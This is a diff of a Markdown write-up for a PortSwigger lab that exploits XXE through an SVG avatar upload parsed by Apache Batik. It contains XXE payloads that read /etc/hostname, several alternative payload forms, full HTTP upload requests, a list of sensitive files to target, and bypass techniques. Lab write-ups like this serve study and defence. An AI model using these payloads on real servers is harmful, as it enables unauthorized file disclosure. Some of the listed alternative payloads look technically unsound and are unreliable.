@@ -13,7 +13,7 @@ XXE (XML External Entity Injection) is a vulnerability that occurs when XML pars
 | **Category** | XXE (XML External Entity) |
 | **Library** | Apache Batik |
 | **Date** | July 19, 2026 |
-| **Hostname Found** | `730e06daaa2d` |
+| **Hostname Found** | `1c3462a1bd38` |
 
 ---
 
@@ -30,39 +30,49 @@ Upload an image that displays the contents of the `/etc/hostname` file after pro
 ![Creating SVG Payload](images/01-creating-svg-payload.png)
 *Figure 1: Creating the malicious SVG file with XXE payload using nano editor*
 
-### Burp Suite - Intercepting Upload Request
+The payload used:
+```xml
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE svg [
+<!ENTITY xxe SYSTEM "file:///etc/hostname">
+]>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
+<text font-size="16" x="0" y="16">&xxe;</text>
+</svg>
+## Uploading the Avatar
+![Selecting avatar.svg](https://images/02-uploading-avatar.png)
+*Figure 2: Selecting avatar.svg file for upload in the comment form*
 
-![Burp Suite Intercept](images/02-burp-intercept.png)
-*Figure 2: Burp Suite intercepting the POST request to /post/comment*
+## Burp Suite - Intercepting Upload Request
+![Burp Suite Intercept](https://images/03-burp-intercept.png)
+*Figure 3: Burp Suite intercepting the POST request with the SVG payload*
 
-### Modified Request in Burp Repeater
+The request shows:
+* `filename="avatar.svg"`
+* `Content-Type: image/svg+xml`
+* The XXE payload in the request body
 
-![Burp Repeater Request](images/03-burp-repeater.png)
-*Figure 3: Modified request with avatar.svg and XML payload in Burp Repeater*
-
-### Successful Comment Submission
-
-![Comment Submission Success](images/04-comment-success.png)
+## Successful Comment Submission
+![Comment Submission Success](https://images/04-comment-success.png)
 *Figure 4: "Thank you for your comment!" response confirming successful upload*
 
-### Extracted Hostname in Avatar
+## Extracted Hostname in Avatar
+![Hostname in Avatar](https://images/05-hostname-in-avatar.png)
+*Figure 5: Hostname 1c3462a1bd38 displayed in the avatar image (visible in the comment section)*
 
-![Hostname in Avatar](images/05-hostname-in-avatar.png)
-*Figure 5: Hostname `730e06daaa2d` displayed in the avatar image (visible after zooming in)*
-
-### Lab Solved
-
-![Lab Solved](images/06-lab-solved.png)
-*Figure 6: Lab completion notification after submitting the hostname*
-
----
+The avatar shows:
+```text
+Henry | 19 July 2026
+testing my payloads
+[Avatar displaying: 1c3462a1bd38]
+```
 
 ## Attack Methodology
 
 ### Reconnaissance Phase
 
 | Step | Action | Details |
-|------|--------|---------|
+| :--- | :--- | :--- |
 | 1 | Identify Upload Feature | Blog comment section allows avatar uploads |
 | 2 | Determine File Types Accepted | SVG files accepted for avatar images |
 | 3 | Identify XML Processing | Apache Batik library processes SVG files |
@@ -70,22 +80,20 @@ Upload an image that displays the contents of the `/etc/hostname` file after pro
 ### Exploitation Phase
 
 | Step | Action | Payload/Command |
-|------|--------|-----------------|
+| :--- | :--- | :--- |
 | 1 | Create SVG Payload | `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>` |
-| 2 | Upload Malicious File | Select `avatar.svg` as avatar |
-| 3 | Intercept with Burp | Capture POST request to `/post/comment` |
-| 4 | Modify Request | Change filename to `avatar.svg`, Content-Type to `image/svg+xml` |
+| 2 | Upload Malicious File | Select avatar.svg as avatar |
+| 3 | Intercept with Burp | Capture POST request to /post/comment |
+| 4 | Modify Request | Change filename to avatar.svg, Content-Type to image/svg+xml |
 | 5 | View Result | Check avatar image for hostname |
-| 6 | Submit Solution | Enter hostname in "Submit solution" button |
-
----
+| 6 | Submit Solution | Enter hostname 1c3462a1bd38 |
 
 ## Core Concepts
 
 ### SVG as XML Vector
 
 | Concept | Description |
-|---------|-------------|
+| :--- | :--- |
 | **SVG Structure** | SVG (Scalable Vector Graphics) is an XML-based vector image format |
 | **Parser** | Apache Batik is a Java-based SVG toolkit that processes SVG files |
 | **Vulnerability** | Batik resolves external entities by default, enabling XXE attacks |
@@ -93,27 +101,35 @@ Upload an image that displays the contents of the `/etc/hostname` file after pro
 ### XML Entity Types
 
 | Type | Syntax | Description |
-|------|--------|-------------|
-| Internal Entity | `<!ENTITY name "value">` | Defined and used within the same XML document |
-| External Entity | `<!ENTITY name SYSTEM "URI">` | Reference external resources using URIs |
-| DOCTYPE Declaration | `<!DOCTYPE root [<!ENTITY name SYSTEM "file:///path">]>` | Defines document type and entity declarations |
-
----
+| :--- | :--- | :--- |
+| **Internal Entity** | `<!ENTITY name "value">` | Defined and used within the same XML document |
+| **External Entity** | `<!ENTITY name SYSTEM "URI">` | Reference external resources using URIs |
+| **DOCTYPE Declaration** | `<!DOCTYPE root [<!ENTITY name SYSTEM "file:///path">]>` | Defines document type and entity declarations |
 
 ## Attack Payloads
 
-### Basic Payload
+### Basic Payload (Used in this Lab)
 
 ```xml
 <?xml version="1.0" standalone="yes"?>
 <!DOCTYPE svg [
-  <!ENTITY xxe SYSTEM "file:///etc/hostname">
+<!ENTITY xxe SYSTEM "file:///etc/hostname">
 ]>
 <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
-  <text font-size="16" x="0" y="16">&xxe;</text>
+<text font-size="16" x="0" y="16">&xxe;</text>
 </svg>
+```
+
+**Breakdown:**
+* `<!DOCTYPE svg [` - Defines Document Type Definition
+* `<!ENTITY xxe SYSTEM "file:///etc/hostname">` - External entity for /etc/hostname
+* `&xxe;` - Entity reference that resolves to file contents
+* `<text>` - SVG element rendering the content
+
 ### Enhanced Payload (Better Visibility)
-```<?xml version="1.0" standalone="yes"?>
+
+```xml
+<?xml version="1.0" standalone="yes"?>
 <!DOCTYPE svg [
   <!ENTITY xxe SYSTEM "file:///etc/hostname">
 ]>
@@ -122,20 +138,35 @@ Upload an image that displays the contents of the `/etc/hostname` file after pro
   <text font-size="24" x="10" y="50" fill="red" font-weight="bold">&xxe;</text>
 </svg>
 ```
+
+**Improvements:**
+* White background for contrast
+* Red text for visibility
+* Larger font size (24px)
+* Better text positioning
+
+### Alternative Payloads
+
+| Payload Type | Content |
+| :--- | :--- |
+| **Without XML Declaration** | `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><svg width="200px" height="200px"><text font-size="24" x="10" y="50">&xxe;</text></svg>` |
+| **Using xlink:href** | `<svg xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="file:///etc/hostname" width="200" height="200"/></svg>` |
+| **Using ForeignObject** | `<svg><foreignObject><div xmlns="http://www.w3.org/1999/xhtml"><p>file:///etc/hostname</p></div></foreignObject></svg>` |
+
 ## Burp Suite Request Analysis
 
 ### Original Request (PNG Upload)
 
 ```http
 POST /post/comment HTTP/2
-Host: 0a6300cb035e668c80892199001f005a.web-security-academy.net
-Cookie: session=QMRvADT706bnnS56HrZyo4pEpuVQlEcR
+Host: 0a08004d033fd943815d2a9900220012.web-security-academy.net
+Cookie: session=your-session
 Content-Type: multipart/form-data; boundary=----Boundary
 
 ------Boundary
 Content-Disposition: form-data; name="csrf"
 
-LhNwjUCoMFEqiXOAC1PL3GZ8vBARPPzZ
+csrf-token
 ------Boundary
 Content-Disposition: form-data; name="postId"
 
@@ -143,11 +174,11 @@ Content-Disposition: form-data; name="postId"
 ------Boundary
 Content-Disposition: form-data; name="comment"
 
-good
+test
 ------Boundary
 Content-Disposition: form-data; name="name"
 
-bob miller
+Henry
 ------Boundary
 Content-Disposition: form-data; name="avatar"; filename="avatar.png"
 Content-Type: image/png
@@ -160,39 +191,38 @@ Content-Type: image/png
 
 ```http
 POST /post/comment HTTP/2
-Host: 0a6300cb035e668c80892199001f005a.web-security-academy.net
-Cookie: session=QMRvADT706bnnS56HrZyo4pEpuVQlEcR
-Content-Type: multipart/form-data; boundary=----Boundary
+Host: 0a08004d033fd943815d2a9900220012.web-security-academy.net
+Cookie: session=your-session
+Content-Type: multipart/form-data; boundary=----geckoforboundaryf09426d8873705cf592648ee28f2b0c6
 
-------Boundary
+------geckoforboundaryf09426d8873705cf592648ee28f2b0c6
 Content-Disposition: form-data; name="csrf"
 
-LhNwjUCoMFEqiXOAC1PL3GZ8vBARPPzZ
-------Boundary
+csrf-token
+------geckoforboundaryf09426d8873705cf592648ee28f2b0c6
 Content-Disposition: form-data; name="postId"
 
 1
-------Boundary
+------geckoforboundaryf09426d8873705cf592648ee28f2b0c6
 Content-Disposition: form-data; name="comment"
 
-good
-------Boundary
+testing my payloads
+------geckoforboundaryf09426d8873705cf592648ee28f2b0c6
 Content-Disposition: form-data; name="name"
 
-bob miller
-------Boundary
+Henry
+------geckoforboundaryf09426d8873705cf592648ee28f2b0c6
 Content-Disposition: form-data; name="avatar"; filename="avatar.svg"
 Content-Type: image/svg+xml
 
 <?xml version="1.0" standalone="yes"?>
 <!DOCTYPE svg [
-  <!ENTITY xxe SYSTEM "file:///etc/hostname">
+<!ENTITY xxe SYSTEM "file:///etc/hostname">
 ]>
-<svg width="200px" height="200px" xmlns="http://www.w3.org/2000/svg">
-  <rect width="200" height="200" fill="white"/>
-  <text font-size="24" x="10" y="50" fill="red" font-weight="bold">&xxe;</text>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
+<text font-size="16" x="0" y="16">&xxe;</text>
 </svg>
-------Boundary--
+------geckoforboundaryf09426d8873705cf592648ee28f2b0c6--
 ```
 
 ## Key Modifications
@@ -210,33 +240,27 @@ Content-Type: image/svg+xml
 | **Linux** | `/etc/hostname`, `/etc/passwd`, `/etc/shadow`, `/etc/hosts`, `/proc/self/environ`, `/var/www/html/config.php` |
 | **Windows** | `C:\windows\win.ini`, `C:\windows\system32\drivers\etc\hosts`, `C:\inetpub\wwwroot\web.config` |
 
----
-
 ## Results
 
 ### Extracted Data
-* **File:** `/etc/hostname`
-* **Content:** `730e06daaa2d`
+
+| File | Content |
+| :--- | :--- |
+| `/etc/hostname` | `1c3462a1bd38` |
 
 ### Comment Display
 ```text
-bob miller | 19 July 2026
-good
-[Avatar displaying: 730e06daaa2d]
+Henry | 19 July 2026
+testing my payloads
+[Avatar displaying: 1c3462a1bd38]
 ```
-***
-
-Would you like me to check any other blocks of markdown text for **syntax structure** or **rendering errors**?
-
 
 ### Lab Completion
 
 | Attribute | Value |
 | :--- | :--- |
-| **Hostname submitted** | `730e06daaa2d` |
+| **Hostname submitted** | `1c3462a1bd38` |
 | **Status** | ✅ Solved |
-
----
 
 ## Common Issues and Solutions
 
@@ -269,25 +293,35 @@ Enclosed Exception: The processing instruction target matching "[xX][mM][lL]" is
   * Set `Content-Type: image/svg+xml`
   * Verify the SVG XML is properly formatted
 
----
+### Issue 4: Entity Reference Error
+* **Problem:** The entity reference `&xxe;` appears as text instead of being resolved.
+* **Solutions:**
+  * Ensure the entity is properly defined in DOCTYPE
+  * Check for typos in entity name
+  * Verify the XML syntax is correct
 
 ## Defenses and Bypasses
 
 ### Common Defenses
-* **Disable External Entities:** Configure XML parser to not resolve external entities
-* **Input Validation:** Validate file types, content, and extensions
-* **Sanitize SVGs:** Use libraries like SVG Sanitizer
-* **Whitelist:** Only allow specific image formats (PNG, JPG, GIF)
+
+| Defense | Description |
+| :--- | :--- |
+| **Disable External Entities** | Configure XML parser to not resolve external entities |
+| **Input Validation** | Validate file types, content, and extensions |
+| **Sanitize SVGs** | Use libraries like SVG Sanitizer |
+| **Whitelist** | Only allow specific image formats (PNG, JPG, GIF) |
 
 ### Bypass Techniques
-* **Different Protocols:** Use `file://`, `http://`, `ftp://`, `php://` wrappers
-* **Parameter Entities:** Use `%` entities for internal DTD references
-* **Encoding:** Use `CDATA` sections, HTML encoding, base64
-* **Alternative Parsers:** Exploit different XML parser behaviors
 
----
+| Technique | Description |
+| :--- | :--- |
+| **Different Protocols** | Use `file://`, `http://`, `ftp://`, `php://` wrappers |
+| **Parameter Entities** | Use `%` entities for internal DTD references |
+| **Encoding** | Use CDATA sections, HTML encoding, base64 |
+| **Alternative Parsers** | Exploit different XML parser behaviors |
 
 ## Tools and Resources
+
 * **Burp Suite Repeater:** Test payloads and modify requests
 * **Burp Suite Proxy:** Intercept and view HTTP traffic
 * **Nano/VSCode:** Create SVG payload files
@@ -295,33 +329,9 @@ Enclosed Exception: The processing instruction target matching "[xX][mM][lL]" is
 * **PayloadsAllTheThings:** XXE payload wordlist
 * **HackTricks:** XML injection references
 
----
-
 ## Methodology Mindset
 
 | Phase | Action Items |
 | :--- | :--- |
 | **1. Identify Entry Points** | Check file upload forms, comment sections, avatar uploads |
 | **2. Analyze File Processing** | Determine which libraries process uploaded files |
-| **3. Test SVG Upload** | Try uploading SVG files to see if accepted |
-| **4. Create Payload** | Craft XXE payload to read system files |
-| **5. Intercept Request** | Use Burp to modify filename and Content-Type |
-| **6. View Output** | Check rendered image for extracted data |
-| **7. Submit Solution** | Submit extracted data to complete lab |
-
-
-## Key Takeaways
-* **SVG = XML:** SVG files are processed as XML, making them vulnerable to XXE
-* **Apache Batik Vulnerability:** The library resolves external entities by default
-* **File Extension Matters:** Ensure `.svg` extension and proper `Content-Type`
-* **Check the Corners:** Extracted data may appear tiny - zoom in!
-* **Multiple Payloads:** Try different syntax if the first one fails
-
----
-
-## References
-* PortSwigger - Exploiting XXE via image file upload
-* OWASP XXE Prevention Cheat Sheet
-* Apache Batik Security
-* HackTricks - XXE
-* PayloadsAllTheThings - XXE
